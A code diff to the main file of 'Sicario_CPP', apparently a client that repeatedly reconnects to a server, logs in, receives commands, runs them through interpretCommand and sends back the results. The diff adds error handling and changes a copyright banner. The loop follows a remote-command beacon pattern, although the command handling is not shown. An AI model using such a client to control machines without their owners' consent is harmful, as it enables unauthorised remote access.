@@ -8,13 +8,23 @@
 #endif
 
 #include "sicarioClient.h"
+#include "errors.h"
+
+void catchError(unsigned short error) {
+    if(errorList[error].critical == true) {
+        std::cerr << errorList[error].text;
+        exit(error);
+    } else {
+        std::cerr << errorList[error].text;
+    }
+}
 
 // Warning: Platform-specific!
 void sleepFor(unsigned long long seconds) {
     sleep(seconds);
 }
 
-const std::string msg_copyright = "Sicario_CPP // 2018 // Made by Erusima and Dante383\n\n";
+const std::string msg_copyright = "// Sicario_CPP // 2018 // Made by Erusima and Dante383 //\n\n";
 
 int main(int argc, char** argv) {
     std::cout << msg_copyright;
@@ -23,15 +33,19 @@ int main(int argc, char** argv) {
     client.disconnect();
     while(true) {
         sleepFor(client.connInterval);
-        client.reconnect();
-        client.loginUser(client.userKey);
-        std::string data = "";
-        do {
-            data = client.receiveData();
-            std::string result = client.interpretCommand(data);
-            client.sendData(result);
-        } while(data != "");
-        client.disconnect();
+        try {
+            client.reconnect();
+            client.loginUser(client.userKey);
+            std::string data = "";
+            do {
+                data = client.receiveData();
+                std::string result = client.interpretCommand(data);
+                client.sendData(result);
+            } while(data != "");
+            client.disconnect();
+        } catch(unsigned short error) {
+            catchError(error);
+        }
     }
 }
 
